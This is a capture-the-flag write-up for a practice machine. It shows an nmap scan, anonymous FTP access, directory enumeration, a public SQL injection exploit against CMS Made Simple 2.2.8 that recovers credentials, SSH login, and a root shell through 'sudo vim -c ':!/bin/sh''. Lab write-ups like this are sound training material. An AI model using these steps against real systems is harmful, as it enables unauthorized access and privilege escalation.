**Tristan Gomez**


To begin the challenge, I ran a classic nmap scan using the -sV flag to get version numbers of services running on open ports.
```
└─$ sudo nmap -sV 10.10.35.175
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-17 14:27 PDT
Nmap scan report for 10.10.35.175
Host is up (0.19s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```


Looks like there's ftp running, let's try to login with `anonymous:password` because it's easy, low-hanging fruit.
```
ftp> open 10.10.210.174
Connected to 10.10.210.174.
220 (vsFTPd 3.0.3)
Name (10.10.210.174:gomez22): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cat pub
?Invalid command
ftp> get pub
local: pub remote: pub
200 PORT command successful. Consider using PASV.
550 Failed to open file.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00 secs (48.5503 kB/s)
```

We seem to have found `ForMitch.txt`, let's see what is says!
```
└─$ cat ForMitch.txt
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

Hmm, so we'll keep it in mind that `mitch` has a weak password.

Let's perform a gobuster scan to see what webpages we can find.
```
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js -u http://10.10.210.174
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.210.174
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt,js
[+] Timeout:                 10s
===============================================================
2021/12/20 14:54:49 Starting gobuster in directory enumeration mode
===============================================================
/.hta.js              (Status: 403) [Size: 295]
/.hta                 (Status: 403) [Size: 292]
/.hta.php             (Status: 403) [Size: 296]
/.hta.html            (Status: 403) [Size: 297]
/.hta.txt             (Status: 403) [Size: 296]
/.htpasswd.js         (Status: 403) [Size: 300]
/.htaccess.php        (Status: 403) [Size: 301]
/.htpasswd.php        (Status: 403) [Size: 301]
/.htaccess.html       (Status: 403) [Size: 302]
/.htpasswd.html       (Status: 403) [Size: 302]
/.htaccess.txt        (Status: 403) [Size: 301]
/.htpasswd.txt        (Status: 403) [Size: 301]
/.htaccess.js         (Status: 403) [Size: 300]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/index.html           (Status: 200) [Size: 11321]
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 301]
/simple               (Status: 301) [Size: 315] [--> http://10.10.210.174/simple/]
```

Gobuster found /simple. Navigating there I find a CMS page with the version number and a link to a login page. -> `CMS Made Simple</a> version 2.2.8</p>`.


Let's check searchsploit to see if we can find any helpful exploit scripts.
```
└─$ searchsploit cms 2.2.8
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Bolt CMS < 3.6.2 - Cross-Site Scripting                                          | php/webapps/46014.txt
CMS Made Simple < 2.2.10 - SQL Injection                                         | php/webapps/46635.py
Concrete CMS < 5.5.21 - Multiple Vulnerabilities                                 | php/webapps/37225.pl
Concrete5 CMS < 5.4.2.1 - Multiple Vulnerabilities                               | php/webapps/17925.txt
Concrete5 CMS < 8.3.0 - Username / Comments Enumeration                          | php/webapps/44194.py
DeDeCMS < 5.7-sp1 - Remote File Inclusion                                        | php/webapps/37423.txt
Kirby CMS < 2.5.7 - Cross-Site Scripting                                         | php/webapps/43140.txt
Monstra CMS < 3.0.4 - Cross-Site Scripting (1)                                   | php/webapps/44855.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (2)                                   | php/webapps/44646.txt
Mura CMS < 6.2 - Server-Side Request Forgery / XML External Entity Injection     | cfm/webapps/43045.txt
Redaxo CMS Mediapool Addon < 5.5.1 - Arbitrary File Upload                       | php/webapps/44891.txt
zKup CMS 2.0 < 2.3 - Arbitrary File Upload                                       | php/webapps/5220.php
zKup CMS 2.0 < 2.3 - Remote Add Admin                                            | php/webapps/5219.php
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

BINGO! `CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py`. I copied the script into my working directory. I had to change its permissions to make it executable. I also had to add parentheses to the print statements to make this script work with Python3.

`Python3 *.py -u http://10.10.210.74` results...
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[*] Try: secret

```

Using the credentials found (`mitch:secret`), let's ssh in.
`ssh mitch@10.10.210.174 -p 2222`

```
$ cat user.txt
G00d j0b, keep up!
```

Now that we have the user flag, we need to privesc to get the root flag.
Let's check the permissions for this user.
```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

```
Hmm, we can run `vim` as root with no password. Let's consult gtfobins to see how we can abuse this.

`gtfobins`
```
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
```

Running `sudo vim -c ':!/bin/sh'` we become the root user! Lets grab the root flag and finish this challenge.
```
# cat /root/root.txt
W3ll d0n3. You made it!
```
